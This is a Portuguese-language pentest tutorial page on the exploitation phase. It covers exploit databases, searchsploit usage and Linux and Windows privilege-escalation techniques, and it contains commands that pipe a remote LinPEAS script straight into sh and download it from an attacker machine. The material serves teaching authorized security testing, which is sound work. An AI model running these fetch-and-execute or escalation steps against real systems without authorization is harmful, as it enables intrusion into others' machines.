Exploração (Exploitation)

O que é Exploração?

Exploração (Exploitation)

Aproveitamento de vulnerabilidades para obter acesso e demonstrar impacto real.

Exploração é a fase em que vulnerabilidades identificadas na enumeração são efetivamente aproveitadas para obter acesso a sistemas. É a parte mais técnica e visível do pentest, mas lembre: é apenas um passo no processo — o objetivo é demonstrar impacto, não a técnica em si.

Princípio da responsabilidade: Em pentest real, use o exploit menos impactante necessário para demonstrar a vulnerabilidade. Crashes de serviço, destruição de dados e DoS acidental devem ser evitados. Documente tudo com timestamp.

Seleção de Exploits

Exploit-DB / exploit-db.com

Banco de dados público de exploits verificados. Busque por CVE, nome do software ou versão. Conteúdo verificado pela Offensive Security. Acessível pelo comando searchsploit no Kali.

Metasploit Framework

O framework de exploits mais usado. Busca, configuração e execução de exploits com framework padronizado. Inclui payloads, encoders e ferramentas de pós-exploração. Ver Metasploit em detalhes.

GitHub / NVD / CVE MITRE

Para vulnerabilidades recentes, buscar no GitHub por "CVE-XXXX-YYYY exploit" frequentemente revela PoCs. NVD tem links para referências e PoCs para cada CVE.

# searchsploit — buscar exploit no Exploit-DB local:
searchsploit apache 2.4.49
searchsploit -p 50383   # mostrar path completo do exploit
searchsploit -m 50383   # copiar exploit para pasta atual

# Busca por CVE específica:
searchsploit CVE-2021-41773

Escalação de Privilégio

Após obter acesso inicial com usuário comum, o próximo passo é escalar para root/SYSTEM para demonstrar o impacto completo.

Linux PrivEsc

  • SUID binaries: find / -perm -4000 2>/dev/null
  • Sudo rights: sudo -l
  • Cron jobs com scripts de usuário com write access
  • Kernel exploits (ex: DirtyCow, PwnKit/CVE-2021-4034)
  • Weak file permissions em arquivos sensíveis
  • Ferramentas: LinPEAS, Linux Smart Enumeration (lse.sh)

Windows PrivEsc

  • Unquoted service paths
  • Weak service permissions (sc config)
  • AlwaysInstallElevated (MSI)
  • Token impersonation (PrintSpoofer, JuicyPotato, GodPotato)
  • Insecure registry permissions
  • Ferramentas: WinPEAS, PowerUp, Seatbelt
# LinPEAS — enumeração automática de PrivEsc em Linux:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Ou transferir para target e executar:
wget http://seu-kali/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh 2>&1 | tee output.txt

Exploração bem documentada é o coração do relatório de pentest. Cada passo deve ter screenshot e timestamp. A evidência mais impactante é ter chegado ao Domain Admin ou root — demonstrando o risco real. Próxima fase: Pós-Exploração.

"Explorar uma vulnerabilidade é provar que o risco é real. Documentá-la é provar que o pentest foi profissional."
